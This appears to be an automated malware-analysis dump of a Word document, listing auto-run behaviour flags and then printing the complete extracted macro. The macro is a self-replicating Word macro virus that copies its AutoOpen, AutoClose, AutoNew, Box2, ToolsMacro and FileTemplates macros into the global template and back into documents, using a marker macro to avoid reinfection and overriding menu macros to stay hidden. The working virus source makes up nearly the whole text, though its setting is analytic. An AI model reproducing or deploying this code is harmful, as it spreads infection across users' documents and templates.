behavior.AutoClose: Runs when the Word document is closed
behavior.AutoNew: Runs when a new Word document is created
behavior.AutoOpen: Runs when the Word document is opened
behavior.Base64 Strings: Base64-encoded str were detected, may be used to obfuscate str
behavior.Hex Strings: Hex-encoded str were detected, may be used to obfuscate str

docinfo.macro:

Public Sub MAIN()
Dim A$
Dim B$
Dim macro1
Dim i
Dim N
Dim macro2
Dim j
Dim NN
On Error Resume Next
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
A$ = dlg.Template
B$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)
macro1 = WordBasic.CountMacros(0)
If macro1 > 0 Then
For i = 1 To macro1
If WordBasic.[MacroName$](i, 0) = "Box2" Then N = 1
Next i
End If
If N <> 1 Then
WordBasic.Organizer Copy:=1, Source:=B$, Destination:=A$, Name:="AutoClose", Tab:=1 + 1 + 1

WordBasic.Organizer Copy:=1, Source:=B$, Destination:=A$, Name:="AutoOpen", Tab:=1 + 1 + 1

WordBasic.Organizer Copy:=1, Source:=B$, Destination:=A$, Name:="AutoNew", Tab:=1 + 1 + 1

WordBasic.Organizer Copy:=1, Source:=B$, Destination:=A$, Name:="Box2", Tab:=1 + 1 + 1

WordBasic.Organizer Copy:=1, Source:=B$, Destination:=A$, Name:="ToolsMacro", Tab:=1 + 1 + 1


WordBasic.Organizer Copy:=1, Source:=B$, Destination:=A$, Name:="FileTemplates", Tab:=1 + 1 + 1


End If

macro2 = WordBasic.CountMacros(1)
If macro2 > 0 Then
   For j = 1 To macro2
       If WordBasic.[MacroName$](j, 1) = "Box2" Then NN = 1
   Next j
End If
If NN <> 1 Then

WordBasic.FileSaveAs Format:= 1

WordBasic.Organizer Copy:=1, Source:=A$, Destination:=B$, Name:="AutoClose", Tab:=1 + 1 + 1

WordBasic.Organizer Copy:=1, Source:=A$, Destination:=B$, Name:="AutoOpen", Tab:=1 + 1 + 1

WordBasic.Organizer Copy:=1, Source:=A$, Destination:=B$, Name:="AutoNew", Tab:=1 + 1 + 1

WordBasic.Organizer Copy:=1, Source:=A$, Destination:=B$, Name:="Box2", Tab:=1 + 1 + 1

WordBasic.Organizer Copy:=1, Source:=A$, Destination:=B$, Name:="ToolsMacro", Tab:=1 + 1 + 1

WordBasic.Organizer Copy:=1, Source:=A$, Destination:=B$, Name:="FileTemplates", Tab:=1 + 1 + 1

End If

exit_:

End Sub
